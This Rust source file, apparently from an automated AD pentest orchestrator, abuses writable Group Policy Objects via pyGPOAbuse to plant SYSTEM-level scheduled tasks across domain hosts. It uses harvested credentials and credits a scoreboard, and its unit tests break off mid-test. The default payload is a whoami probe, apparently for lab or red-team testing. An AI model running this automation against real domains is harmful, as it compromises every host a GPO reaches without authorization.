//! auto_gpo_abuse -- exploit GPO write access for code execution.
//!
//! When a controlled user has write access to a Group Policy Object
//! (e.g., a user has write on a GPO linked to contoso.local),
//! this automation dispatches `pyGPOAbuse` to inject a scheduled task that
//! runs as SYSTEM on all hosts where the GPO applies.
//!
//! GPO vulns are typically discovered via BloodHound edges (WriteProperty,
//! WriteDacl, GenericAll on GPO objects).
//!
//! Dispatch model: deterministic. The previous LLM-routed path
//! (`throttled_submit("exploit", "privesc", payload)`) was unreliable in two
//! ways: (a) the LLM had to infer the `pygpoabuse` tool name from the payload
//! and frequently chose unrelated tools (`bloodhound_collect`, generic
//! `whoami`); (b) the payload omitted the required `command` field that the
//! tool needs to build the scheduled-task XML, so even when the LLM picked
//! the right tool the call failed at the arg-validation step. We dispatch
//! `pygpoabuse_immediate_task` directly with a generated proof command, then
//! `mark_exploited` on success — same scoreboard-credit pattern as the
//! ESC1/ESC3/ESC8/ESC11 deterministic chains.

use std::sync::Arc;
use std::time::Duration;

use ares_core::models::{Credential, VulnerabilityInfo};
use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Dedup key prefix for GPO abuse attacks.
const DEDUP_GPO_ABUSE: &str = "gpo_abuse";

/// Result of parsing `pygpoabuse_immediate_task` stdout. The tool prints
/// `[+] ...` lines on each phase that landed (versionNumber update, scheduled
/// task XML write, gpt.ini bump). The presence of *any* `[+]` line accompanied
/// by either `created`, `updated`, or `success` is the contract:
/// it means the GPO writes succeeded server-side, which is what we credit on
/// the scoreboard. Whether the resulting scheduled task ever fires on a
/// downstream client is gated by GP refresh (90 min default) — out of scope
/// for the dispatcher tick.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum GpoAbuseOutcome {
    /// pygpoabuse confirmed the GPO write — at least one `[+]` success
    /// marker observed (versionNumber/ScheduledTask/gpt.ini).
    Success,
    /// Tool exited but no success markers seen. Either the credentials
    /// don't have write on that GPO, the GPO id was wrong, or the tool
    /// hit a wire-level error before any phase landed. Retryable.
    NoEvidence,
    /// Distinct error patterns we don't want to retry the same way —
    /// the credential is wrong, or the GPO doesn't exist. The caller
    /// burns a failure-counter slot.
    KnownFailure(&'static str),
}

/// Parse pygpoabuse output. Stable enough to bind tests against; the tool's
/// markers haven't changed since the upstream Sploutchy/sploutchy fork
/// settled the `[+]`/`[-]`/`[!]` line prefixes.
pub(crate) fn parse_pygpoabuse_output(output: &str) -> GpoAbuseOutcome {
    let lower = output.to_lowercase();

    if lower.contains("invalid credentials")
        || lower.contains("authentication failed")
        || lower.contains("kdc_err_preauth_failed")
    {
        return GpoAbuseOutcome::KnownFailure("auth");
    }
    if lower.contains("no such object") || lower.contains("no_object") {
        return GpoAbuseOutcome::KnownFailure("gpo_not_found");
    }
    if lower.contains("insufficient access") || lower.contains("access_denied") {
        return GpoAbuseOutcome::KnownFailure("insufficient_rights");
    }

    // Success markers from pygpoabuse. Order them by frequency — every
    // successful run hits versionNumber + scheduled-task lines.
    let has_plus_marker = output.lines().any(|l| l.trim_start().starts_with("[+]"));
    if has_plus_marker
        && (lower.contains("scheduledtask")
            || lower.contains("scheduled task")
            || lower.contains("versionnumber")
            || lower.contains("gpt.ini")
            || lower.contains("successful"))
    {
        return GpoAbuseOutcome::Success;
    }

    GpoAbuseOutcome::NoEvidence
}

/// Classify a `pygpoabuse_immediate_task` dispatch result. Splits the two
/// signals the worker returns — a non-empty `error` field (non-zero exit /
/// internal failure) versus structured stdout — into a single outcome the
/// caller routes on. The asymmetry: if the worker flagged an error but the
/// stdout otherwise parses as `Success`, we downgrade to `NoEvidence` rather
/// than crediting — partial-success states (e.g. versionNumber bumped before
/// the scheduled-task write failed) are unsafe to mark exploited.
pub(crate) fn classify_exec_outcome(output: &str, had_tool_error: bool) -> GpoAbuseOutcome {
    if had_tool_error {
        return match parse_pygpoabuse_output(output) {
            GpoAbuseOutcome::Success => GpoAbuseOutcome::NoEvidence,
            other => other,
        };
    }
    parse_pygpoabuse_output(output)
}

/// Format the human-readable failure summary that lands in the
/// "GPO abuse: no success markers..." warn log. Worker-reported errors
/// surface first; dispatch errors (Redis BRPOP timeout, queue full, etc.)
/// take precedence over stdout. The fallback string is reused when both
/// signals are absent so the log line is never empty.
pub(crate) fn format_failure_summary(
    dispatch_error: Option<&str>,
    tool_error: Option<&str>,
) -> String {
    if let Some(e) = dispatch_error {
        return format!("dispatch error: {e}");
    }
    tool_error
        .map(str::to_string)
        .unwrap_or_else(|| "no success markers in pygpoabuse output".into())
}

/// Build the `pygpoabuse_immediate_task` argument JSON. Pure — caller passes
/// pre-validated values and gets back the shape the tool expects. The
/// `command` defaults to a benign `whoami` probe written to a unique task
/// name (the tool refuses to overwrite an existing task without `-f`; we
/// always pass `force=true` so retries don't trip on a stale half-applied
/// task from a previous failed run).
pub(crate) fn build_pygpoabuse_args(
    domain: &str,
    username: &str,
    password: &str,
    dc_ip: &str,
    gpo_id: &str,
    task_name_suffix: &str,
) -> serde_json::Value {
    json!({
        "domain": domain,
        "username": username,
        "password": password,
        "dc_ip": dc_ip,
        "gpo_id": gpo_id,
        "command": "cmd /c whoami",
        "task_name": format!("ARES_GPO_Probe_{}", task_name_suffix),
        "force": true,
    })
}

/// Build a [`GpoWork`] for a single vulnerability if every dispatch
/// precondition is met. Pure helper extracted from the `auto_gpo_abuse`
/// filter so the per-vuln short-circuit logic (wrong type, already
/// exploited / processed, no source-user, no matching credential) is
/// directly testable. The `dc_ip_for_domain` closure abstracts the
/// `state.domain_controllers` lookup so callers can stub it in tests.
///
/// `gpo_id` and `dc_ip` are intentionally returned as `Option` here even
/// though `dispatch_gpo_abuse_deterministic` requires both: the second
/// stage's debug logs distinguish "no gpo_id captured" from "no DC IP
/// resolved", so we keep the discrimination through the work item.
pub(crate) fn try_build_gpo_work(
    vuln: &VulnerabilityInfo,
    credentials: &[Credential],
    is_exploited: bool,
    is_processed: bool,
    dc_ip_for_domain: impl FnOnce(&str) -> Option<String>,
) -> Option<GpoWork> {
    if !is_gpo_candidate(&vuln.vuln_type) {
        return None;
    }
    if is_exploited {
        return None;
    }
    let dedup_key = format!("{DEDUP_GPO_ABUSE}:{}", vuln.vuln_id);
    if is_processed {
        return None;
    }

    let source_user = vuln
        .details
        .get("source")
        .or_else(|| vuln.details.get("source_user"))
        .or_else(|| vuln.details.get("account_name"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())?;

    let gpo_id = vuln
        .details
        .get("gpo_id")
        .or_else(|| vuln.details.get("gpo_guid"))
        .or_else(|| vuln.details.get("object_id"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let gpo_name = vuln
        .details
        .get("gpo_name")
        .or_else(|| vuln.details.get("gpo_display_name"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let domain = vuln
        .details
        .get("domain")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();

    let credential = credentials
        .iter()
        .find(|c| {
            c.username.to_lowercase() == source_user.to_lowercase()
                && (domain.is_empty() || c.domain.to_lowercase() == domain.to_lowercase())
        })
        .cloned();

    if credential.is_none() {
        debug!(
            vuln_id = %vuln.vuln_id,
            source = %source_user,
            "GPO abuse skipped: no credential for source user"
        );
        return None;
    }

    let dc_ip = dc_ip_for_domain(&domain.to_lowercase());

    Some(GpoWork {
        vuln_id: vuln.vuln_id.clone(),
        dedup_key,
        source_user,
        gpo_id,
        gpo_name,
        domain,
        dc_ip,
        credential,
    })
}

/// Monitors for GPO write access vulnerabilities and dispatches exploitation.
/// Interval: 30s.
pub async fn auto_gpo_abuse(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("gpo_abuse") {
            continue;
        }

        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }
        }

        let work: Vec<GpoWork> = {
            let state = dispatcher.state.read().await;

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    try_build_gpo_work(
                        vuln,
                        &state.credentials,
                        state.exploited_vulnerabilities.contains(&vuln.vuln_id),
                        state.is_processed(
                            DEDUP_GPO_ABUSE,
                            &format!("{DEDUP_GPO_ABUSE}:{}", vuln.vuln_id),
                        ),
                        |dom| state.domain_controllers.get(dom).cloned(),
                    )
                })
                .collect()
        };

        for item in work {
            dispatch_gpo_abuse_deterministic(&dispatcher, item).await;
        }
    }
}

/// Deterministic GPO abuse chain. Runs `pygpoabuse_immediate_task` via
/// `dispatch_tool` (bypassing the LLM agent loop), parses the tool output,
/// and either marks the vuln exploited or records a failure for retry.
///
/// The dispatch task_id starts with `gpo_abuse_*`, NOT `exploit_*`, so the
/// standard `mark_exploited` path in `result_processing` does not fire for
/// this vuln_id — we explicitly call `mark_exploited` on success. Same
/// scoreboard-credit pattern as the ESC1/ESC3/ESC8/ESC11/mssql_link_pivot
/// deterministic chains.
async fn dispatch_gpo_abuse_deterministic(dispatcher: &Arc<Dispatcher>, item: GpoWork) {
    if dispatcher.state.is_exploit_abandoned(&item.vuln_id).await {
        info!(
            vuln_id = %item.vuln_id,
            "GPO abuse skipped — vuln abandoned (>=MAX_EXPLOIT_FAILURES); locking dedup"
        );
        {
            let mut state = dispatcher.state.write().await;
            state.mark_processed(DEDUP_GPO_ABUSE, item.dedup_key.clone());
        }
        let _ = dispatcher
            .state
            .persist_dedup(&dispatcher.queue, DEDUP_GPO_ABUSE, &item.dedup_key)
            .await;
        return;
    }

    let Some(gpo_id) = item.gpo_id.clone() else {
        debug!(
            vuln_id = %item.vuln_id,
            "GPO abuse skipped — no gpo_id on vuln (BloodHound emit didn't capture the container GUID)"
        );
        return;
    };
    let Some(dc_ip) = item.dc_ip.clone() else {
        debug!(
            vuln_id = %item.vuln_id,
            domain = %item.domain,
            "GPO abuse skipped — no DC IP known for domain (auto_recon hasn't promoted a DC yet)"
        );
        return;
    };
    let Some(cred) = item.credential.clone() else {
        debug!(vuln_id = %item.vuln_id, "GPO abuse skipped — no credential for source user");
        return;
    };

    // Mark dedup BEFORE spawning so the next 30s tick doesn't redispatch
    // while the (~60-90s) pygpoabuse run is in flight.
    {
        let mut state = dispatcher.state.write().await;
        state.mark_processed(DEDUP_GPO_ABUSE, item.dedup_key.clone());
    }
    let _ = dispatcher
        .state
        .persist_dedup(&dispatcher.queue, DEDUP_GPO_ABUSE, &item.dedup_key)
        .await;

    // Short uuid suffix so retries don't trip pygpoabuse's "task already
    // exists" guard. We pass `force=true` anyway, but the unique name keeps
    // the GPO from accumulating ghost tasks.
    let task_suffix = uuid::Uuid::new_v4().simple().to_string()[..8].to_string();
    let tool_args = build_pygpoabuse_args(
        &item.domain,
        &cred.username,
        &cred.password,
        &dc_ip,
        &gpo_id,
        &task_suffix,
    );

    let task_id = format!(
        "gpo_abuse_{}",
        &uuid::Uuid::new_v4().simple().to_string()[..12]
    );
    let call = ares_llm::ToolCall {
        id: format!("pygpoabuse_{}", uuid::Uuid::new_v4().simple()),
        name: "pygpoabuse_immediate_task".to_string(),
        arguments: tool_args,
    };

    info!(
        task_id = %task_id,
        vuln_id = %item.vuln_id,
        source = %item.source_user,
        gpo = ?item.gpo_name,
        gpo_id = %gpo_id,
        dc_ip = %dc_ip,
        "GPO abuse dispatched (direct tool, no LLM)"
    );

    let dispatcher_bg = dispatcher.clone();
    let vuln_id_bg = item.vuln_id.clone();
    let dedup_key_bg = item.dedup_key.clone();
    let gpo_name_bg = item.gpo_name.clone();
    tokio::spawn(async move {
        let result = dispatcher_bg
            .llm_runner
            .tool_dispatcher()
            .dispatch_tool("privesc", &task_id, &call)
            .await;

        let outcome = match &result {
            Ok(exec) => classify_exec_outcome(&exec.output, exec.error.is_some()),
            Err(_) => GpoAbuseOutcome::NoEvidence,
        };

        match outcome {
            GpoAbuseOutcome::Success => {
                if let Err(e) = dispatcher_bg
                    .state
                    .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
                    .await
                {
                    warn!(
                        err = %e,
                        vuln_id = %vuln_id_bg,
                        "Failed to mark GPO abuse exploited (chain succeeded but token not emitted)"
                    );
                }
                info!(
                    vuln_id = %vuln_id_bg,
                    gpo = ?gpo_name_bg,
                    "GPO abuse succeeded — scheduled task XML written; \
                     downstream code-exec lands on next GP refresh"
                );
            }
            GpoAbuseOutcome::KnownFailure(reason) => {
                // Distinct failure — record one slot, abandon if at cap.
                // Don't clear dedup: the cause won't change on retry with
                // the same input (wrong creds, missing GPO, etc.).
                let attempts = dispatcher_bg
                    .state
                    .record_exploit_failure(&vuln_id_bg)
                    .await;
                warn!(
                    vuln_id = %vuln_id_bg,
                    reason,
                    attempts,
                    "GPO abuse hit a known failure mode; dedup stays locked"
                );
            }
            GpoAbuseOutcome::NoEvidence => {
                let attempts = dispatcher_bg
                    .state
                    .record_exploit_failure(&vuln_id_bg)
                    .await;
                let abandoned = dispatcher_bg.state.is_exploit_abandoned(&vuln_id_bg).await;
                let dispatch_err = result.as_ref().err().map(|e| e.to_string());
                let tool_err = result.as_ref().ok().and_then(|exec| exec.error.clone());
                let summary = format_failure_summary(dispatch_err.as_deref(), tool_err.as_deref());
                if abandoned {
                    warn!(
                        vuln_id = %vuln_id_bg,
                        attempts,
                        summary = %summary,
                        "GPO abuse abandoned — exhausted MAX_EXPLOIT_FAILURES; dedup stays locked"
                    );
                    return;
                }
                warn!(
                    vuln_id = %vuln_id_bg,
                    attempts,
                    summary = %summary,
                    "GPO abuse: no success markers — clearing dedup for retry on next tick"
                );
                {
                    let mut state = dispatcher_bg.state.write().await;
                    state.unmark_processed(DEDUP_GPO_ABUSE, &dedup_key_bg);
                }
                let _ = dispatcher_bg
                    .state
                    .unpersist_dedup(&dispatcher_bg.queue, DEDUP_GPO_ABUSE, &dedup_key_bg)
                    .await;
            }
        }
    });
}

pub(crate) struct GpoWork {
    pub(crate) vuln_id: String,
    pub(crate) dedup_key: String,
    pub(crate) source_user: String,
    pub(crate) gpo_id: Option<String>,
    pub(crate) gpo_name: Option<String>,
    pub(crate) domain: String,
    pub(crate) dc_ip: Option<String>,
    pub(crate) credential: Option<Credential>,
}

/// Returns `true` if a vulnerability type represents a GPO abuse candidate.
fn is_gpo_candidate(vuln_type: &str) -> bool {
    let vtype = vuln_type.to_lowercase();
    vtype == "gpo_abuse"
        || vtype == "gpo_write"
        || vtype == "gpo_genericall"
        || vtype == "gpo_genericwrite"
        || vtype == "gpo_writedacl"
        || vtype == "gpo_writeowner"
        || vtype.starts_with("gpo_")
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::Value;
    use std::collections::HashMap;

    #[test]
    fn is_gpo_candidate_basic() {
        assert!(is_gpo_candidate("gpo_abuse"));
        assert!(is_gpo_candidate("GPO_ABUSE"));
        assert!(is_gpo_candidate("gpo_write"));
        assert!(is_gpo_candidate("gpo_genericall"));
        assert!(is_gpo_candidate("gpo_writedacl"));
        assert!(!is_gpo_candidate("genericall"));
        assert!(!is_gpo_candidate("rbcd"));
        assert!(!is_gpo_candidate("esc1"));
    }

    #[test]
    fn is_gpo_candidate_all_explicit_types() {
        // Verify every explicitly listed GPO vuln type
        let gpo_types = vec![
            "gpo_abuse",
            "gpo_write",
            "gpo_genericall",
            "gpo_genericwrite",
            "gpo_writedacl",
            "gpo_writeowner",
        ];
        for vtype in &gpo_types {
            assert!(is_gpo_candidate(vtype), "{vtype} should be GPO candidate");
        }
        // Also verify case-insensitive matching
        for vtype in &gpo_types {
            let upper = vtype.to_uppercase();
            assert!(
                is_gpo_candidate(&upper),
                "{upper} should be GPO candidate (case-insensitive)"
            );
        }
    }

    #[test]
    fn is_gpo_candidate_wildcard_prefix() {
        // Anything starting with gpo_ should match via starts_with
        assert!(is_gpo_candidate("gpo_custom_edge"));
        assert!(is_gpo_candidate("GPO_something_new"));
        assert!(is_gpo_candidate("gpo_"));
    }

    #[test]
    fn is_gpo_candidate_non_gpo_types() {
        // Exhaustive negative cases
        let non_gpo = vec![
            "rbcd",
            "esc1",
            "esc4",
            "esc8",
            "shadow_credentials",
            "constrained_delegation",
            "unconstrained_delegation",
            "genericall",
            "genericwrite",
            "writedacl",
            "dcsync",
            "mssql_impersonation",
            "",
        ];
        for vtype in non_gpo {
            assert!(
                !is_gpo_candidate(vtype),
                "{vtype:?} should NOT be GPO candidate"
            );
        }
    }

    #[test]
    fn dedup_key_format() {
        let vuln_id = "vuln-gpo-001";
        let dedup_key = format!("{DEDUP_GPO_ABUSE}:{vuln_id}");
        assert_eq!(dedup_key, "gpo_abuse:vuln-gpo-001");
    }

    #[test]
    fn dedup_key_constant() {
        assert_eq!(DEDUP_GPO_ABUSE, "gpo_abuse");
    }

    /// Helper: simulate the source_user extraction logic from auto_gpo_abuse
    fn extract_gpo_source_user(details: &HashMap<String, Value>) -> Option<String> {
        details
            .get("source")
            .or_else(|| details.get("source_user"))
            .or_else(|| details.get("account_name"))
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
    }

    /// Helper: simulate the gpo_id extraction logic from auto_gpo_abuse
    fn extract_gpo_id(details: &HashMap<String, Value>) -> Option<String> {
        details
            .get("gpo_id")
            .or_else(|| details.get("gpo_guid"))
            .or_else(|| details.get("object_id"))
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
    }

    /// Helper: simulate the gpo_name extraction logic from auto_gpo_abuse
    fn extract_gpo_name(details: &HashMap<String, Value>) -> Option<String> {
        details
            .get("gpo_name")
            .or_else(|| details.get("gpo_display_name"))
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
    }

    #[test]
    fn extract_source_user_from_source_key() {
        let mut details = HashMap::new();
        details.insert("source".to_string(), json!("jdoe"));
        assert_eq!(extract_gpo_source_user(&details), Some("jdoe".to_string()));
    }

    #[test]
    fn extract_source_user_from_source_user_key() {
        let mut details = HashMap::new();
        details.insert("source_user".to_string(), json!("admin"));
        assert_eq!(extract_gpo_source_user(&details), Some("admin".to_string()));
    }

    #[test]
    fn extract_source_user_from_account_name_key() {
        let mut details = HashMap::new();
        details.insert("account_name".to_string(), json!("svc_gpo"));
        assert_eq!(
            extract_gpo_source_user(&details),
            Some("svc_gpo".to_string())
        );
    }

    #[test]
    fn extract_source_user_prefers_source_over_account_name() {
        // "source" takes priority over "account_name"
        let mut details = HashMap::new();
        details.insert("source".to_string(), json!("primary_user"));
        details.insert("account_name".to_string(), json!("fallback_user"));
        assert_eq!(
            extract_gpo_source_user(&details),
            Some("primary_user".to_string())
        );
    }

    #[test]
    fn extract_source_user_prefers_source_over_source_user() {
        // "source" takes priority over "source_user"
        let mut details = HashMap::new();
        details.insert("source".to_string(), json!("first"));
        details.insert("source_user".to_string(), json!("second"));
        assert_eq!(extract_gpo_source_user(&details), Some("first".to_string()));
    }

    #[test]
    fn extract_source_user_none_when_empty() {
        let details = HashMap::new();
        assert_eq!(extract_gpo_source_user(&details), None);
    }

    #[test]
    fn extract_source_user_none_when_non_string() {
        let mut details = HashMap::new();
        details.insert("source".to_string(), json!(42));
        assert_eq!(extract_gpo_source_user(&details), None);
    }

    #[test]
    fn extract_gpo_id_from_gpo_id_key() {
        let mut details = HashMap::new();
        details.insert(
            "gpo_id".to_string(),
            json!("{6AC1786C-016F-11D2-945F-00C04fB984F9}"),
        );
        assert_eq!(
            extract_gpo_id(&details),
            Some("{6AC1786C-016F-11D2-945F-00C04fB984F9}".to_string())
        );
    }

    #[test]
    fn extract_gpo_id_from_gpo_guid_key() {
        let mut details = HashMap::new();
        details.insert(
            "gpo_guid".to_string(),
            json!("{31B2F340-016D-11D2-945F-00C04FB984F9}"),
        );
        assert_eq!(
            extract_gpo_id(&details),
            Some("{31B2F340-016D-11D2-945F-00C04FB984F9}".to_string())
        );
    }

    #[test]
    fn extract_gpo_id_from_object_id_key() {
        let mut details = HashMap::new();
        details.insert("object_id".to_string(), json!("S-1-5-21-abc-123"));
        assert_eq!(
            extract_gpo_id(&details),
            Some("S-1-5-21-abc-123".to_string())
        );
    }

    #[test]
    fn extract_gpo_id_prefers_gpo_id_over_gpo_guid() {
        let mut details = HashMap::new();
        details.insert("gpo_id".to_string(), json!("primary-gpo"));
        details.insert("gpo_guid".to_string(), json!("fallback-guid"));
        assert_eq!(extract_gpo_id(&details), Some("primary-gpo".to_string()));
    }

    #[test]
    fn extract_gpo_id_none_when_empty() {
        let details = HashMap::new();
        assert_eq!(extract_gpo_id(&details), None);
    }

    #[test]
    fn extract_gpo_name_from_gpo_name_key() {
        let mut details = HashMap::new();
        details.insert("gpo_name".to_string(), json!("Default Domain Policy"));
        assert_eq!(
            extract_gpo_name(&details),
            Some("Default Domain Policy".to_string())
        );
    }

    #[test]
    fn extract_gpo_name_from_display_name_key() {
        let mut details = HashMap::new();
        details.insert(
            "gpo_display_name".to_string(),
            json!("Server Hardening Policy"),
        );
        assert_eq!(
            extract_gpo_name(&details),
            Some("Server Hardening Policy".to_string())
        );
    }

    #[test]
    fn extract_gpo_name_prefers_gpo_name_over_display_name() {
        let mut details = HashMap::new();
        details.insert("gpo_name".to_string(), json!("Primary Name"));
        details.insert("gpo_display_name".to_string(), json!("Display Name"));
        assert_eq!(extract_gpo_name(&details), Some("Primary Name".to_string()));
    }

    #[test]
    fn extract_gpo_name_none_when_empty() {
        let details = HashMap::new();
        assert_eq!(extract_gpo_name(&details), None);
    }

    #[test]
    fn extract_gpo_name_none_when_non_string() {
        let mut details = HashMap::new();
        details.insert("gpo_name".to_string(), json!(true));
        assert_eq!(extract_gpo_name(&details), None);
    }

    #[test]
    fn domain_extraction_from_details() {
        // Simulate the domain extraction logic from auto_gpo_abuse
        let mut details = HashMap::new();
        details.insert("domain".to_string(), json!("contoso.local"));
        let domain = details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        assert_eq!(domain, "contoso.local");
    }

    #[test]
    fn domain_extraction_missing_defaults_empty() {
        let details: HashMap<String, Value> = HashMap::new();
        let domain = details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        assert_eq!(domain, "");
    }

    // ── parse_pygpoabuse_output ────────────────────────────────────────

    #[test]
    fn parse_pygpoabuse_output_recognises_scheduled_task_success() {
        // Realistic pygpoabuse output for a successful GPO write: the tool
        // prints `[+]` lines as each phase lands.
        let stdout = "[+] versionNumber updated\n\
            [+] gpt.ini saved\n\
            [+] ScheduledTask created!\n";
        assert_eq!(
            parse_pygpoabuse_output(stdout),
            GpoAbuseOutcome::Success,
            "canonical success output must classify as Success"
        );
    }

    #[test]
    fn parse_pygpoabuse_output_success_via_versionnumber_only() {
        // Some pygpoabuse runs print versionNumber but emit the scheduled-
        // task line on stderr (which we don't pass through). Treat
        // versionNumber + [+] marker as success on its own.
        let stdout = "[+] versionNumber updated to 5\n";
        assert_eq!(parse_pygpoabuse_output(stdout), GpoAbuseOutcome::Success);
    }

    #[test]
    fn parse_pygpoabuse_output_no_markers_is_noevidence() {
        // Output without any `[+]` markers — almost always means the tool
        // bailed before writing anything (LDAP connect issues, etc.).
        let stdout = "Connecting to dc01.contoso.local...\n\
            Operation pending.\n";
        assert_eq!(parse_pygpoabuse_output(stdout), GpoAbuseOutcome::NoEvidence);
    }

    #[test]
    fn parse_pygpoabuse_output_invalid_credentials_is_known_failure() {
        let stdout = "[-] Invalid credentials provided\n";
        assert_eq!(
            parse_pygpoabuse_output(stdout),
            GpoAbuseOutcome::KnownFailure("auth")
        );
    }

    #[test]
    fn parse_pygpoabuse_output_kdc_preauth_is_known_failure() {
        // Kerberos pre-auth failure surfaces with `KDC_ERR_PREAUTH_FAILED`.
        let stdout = "Error: KDC_ERR_PREAUTH_FAILED\n";
        assert_eq!(
            parse_pygpoabuse_output(stdout),
            GpoAbuseOutcome::KnownFailure("auth")
        );
    }

    #[test]
    fn parse_pygpoabuse_output_gpo_not_found_is_known_failure() {
        let stdout = "[!] LDAP search failed: no such object\n";
        assert_eq!(
            parse_pygpoabuse_output(stdout),
            GpoAbuseOutcome::KnownFailure("gpo_not_found")
        );
    }

    #[test]
    fn parse_pygpoabuse_output_insufficient_rights_is_known_failure() {
        let stdout = "Modify operation failed: insufficient access rights\n";
        assert_eq!(
            parse_pygpoabuse_output(stdout),
            GpoAbuseOutcome::KnownFailure("insufficient_rights")
        );
    }

    #[test]
    fn parse_pygpoabuse_output_known_failure_wins_over_success_marker() {
        // If a [+] marker appears alongside a known auth failure, the
        // auth verdict still wins — pygpoabuse may have printed the marker
        // for an earlier phase (e.g., versionNumber read) before the
        // ScheduledTask write hit the rejected auth path. We don't credit
        // a partial state.
        let stdout = "[+] versionNumber updated\n\
            [-] Invalid credentials provided\n";
        assert_eq!(
            parse_pygpoabuse_output(stdout),
            GpoAbuseOutcome::KnownFailure("auth"),
            "auth-failure verdict must override partial success marker"
        );
    }

    #[test]
    fn parse_pygpoabuse_output_empty_string_is_noevidence() {
        assert_eq!(parse_pygpoabuse_output(""), GpoAbuseOutcome::NoEvidence);
    }

    // ── build_pygpoabuse_args ──────────────────────────────────────────

    #[test]
    fn build_pygpoabuse_args_includes_all_required_fields() {
        let args = build_pygpoabuse_args(
            "contoso.local",
            "alice",
            "P@ssw0rd!",
            "192.168.58.10",
            "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
            "abc12345",
        );
        assert_eq!(args["domain"], "contoso.local");
        assert_eq!(args["username"], "alice");
        assert_eq!(args["password"], "P@ssw0rd!");
        assert_eq!(args["dc_ip"], "192.168.58.10");
        assert_eq!(args["gpo_id"], "{6AC1786C-016F-11D2-945F-00C04fB984F9}");
        assert_eq!(args["task_name"], "ARES_GPO_Probe_abc12345");
        assert_eq!(args["force"], true);
        assert!(
            args["command"].as_str().unwrap().contains("whoami"),
            "default probe command must include whoami"
        );
    }

    #[test]
    fn build_pygpoabuse_args_force_is_always_true() {
        // Without force=true, pygpoabuse refuses to overwrite an existing
        // scheduled task on retry — we'd loop forever after the first
        // partial run.
        let args = build_pygpoabuse_args(
            "contoso.local",
            "alice",
            "P@ssw0rd!",
            "192.168.58.10",
            "any-gpo",
            "suffix",
        );
        assert_eq!(args["force"], true);
    }

    #[test]
    fn build_pygpoabuse_args_task_name_carries_suffix() {
        // Two different suffixes must produce distinct task_names so retries
        // don't accumulate ghost tasks on the GPO.
        let a = build_pygpoabuse_args("d", "u", "p", "10", "g", "alpha111");
        let b = build_pygpoabuse_args("d", "u", "p", "10", "g", "beta2222");
        assert_ne!(a["task_name"], b["task_name"]);
        assert!(a["task_name"].as_str().unwrap().ends_with("alpha111"));
        assert!(b["task_name"].as_str().unwrap().ends_with("beta2222"));
    }

    // ── classify_exec_outcome ─────────────────────────────────────────

    #[test]
    fn classify_exec_outcome_clean_success_passes_through() {
        let outcome = classify_exec_outcome("[+] ScheduledTask created!\n", false);
        assert_eq!(outcome, GpoAbuseOutcome::Success);
    }

    #[test]
    fn classify_exec_outcome_tool_error_downgrades_success_to_noevidence() {
        // The dangerous case: stdout looks like success (versionNumber bump
        // landed) but the worker reported a non-zero exit. We must NOT mark
        // exploited — partial-state runs are unsafe to credit.
        let outcome = classify_exec_outcome("[+] versionNumber updated\n", true);
        assert_eq!(outcome, GpoAbuseOutcome::NoEvidence);
    }

    #[test]
    fn classify_exec_outcome_tool_error_preserves_known_failure() {
        // Worker error + auth-failure stdout: keep the auth verdict so the
        // caller burns a failure-counter slot instead of retrying blindly.
        let outcome = classify_exec_outcome("[-] Invalid credentials provided\n", true);
        assert_eq!(outcome, GpoAbuseOutcome::KnownFailure("auth"));
    }

    #[test]
    fn classify_exec_outcome_tool_error_with_no_evidence_stays_no_evidence() {
        let outcome = classify_exec_outcome("Connecting...\n", true);
        assert_eq!(outcome, GpoAbuseOutcome::NoEvidence);
    }

    // ── format_failure_summary ────────────────────────────────────────

    #[test]
    fn format_failure_summary_dispatch_error_wins() {
        // Redis BRPOP timeout / queue full → dispatch error takes precedence
        // over any tool-side error message.
        let s = format_failure_summary(Some("redis brpop timeout"), Some("tool stderr"));
        assert_eq!(s, "dispatch error: redis brpop timeout");
    }

    #[test]
    fn format_failure_summary_tool_error_when_no_dispatch_error() {
        let s = format_failure_summary(None, Some("missing field 'command'"));
        assert_eq!(s, "missing field 'command'");
    }

    #[test]
    fn format_failure_summary_fallback_when_both_absent() {
        let s = format_failure_summary(None, None);
        assert_eq!(s, "no success markers in pygpoabuse output");
    }

    // ── try_build_gpo_work ────────────────────────────────────────────

    fn vuln_with(details: serde_json::Value) -> VulnerabilityInfo {
        VulnerabilityInfo {
            vuln_id: "vuln-gpo-001".into(),
            vuln_type: "gpo_abuse".into(),
            target: "contoso.local".into(),
            discovered_by: "bloodhound_collect".into(),
            discovered_at: chrono::Utc::now(),
            details: serde_json::from_value(details).unwrap(),
            recommended_agent: String::new(),
            priority: 1,
        }
    }

    fn alice_cred() -> Credential {
        Credential {
            id: "cred-1".into(),
            username: "alice".into(),
            password: "P@ssw0rd!".into(),
            domain: "contoso.local".into(),
            source: "test".into(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    #[test]
    fn try_build_gpo_work_happy_path() {
        let vuln = vuln_with(json!({
            "source": "alice",
            "gpo_id": "{6AC1786C-016F-11D2-945F-00C04fB984F9}",
            "gpo_name": "Default Domain Policy",
            "domain": "contoso.local",
        }));
        let creds = vec![alice_cred()];

        let work = try_build_gpo_work(&vuln, &creds, false, false, |dom| {
            assert_eq!(dom, "contoso.local");
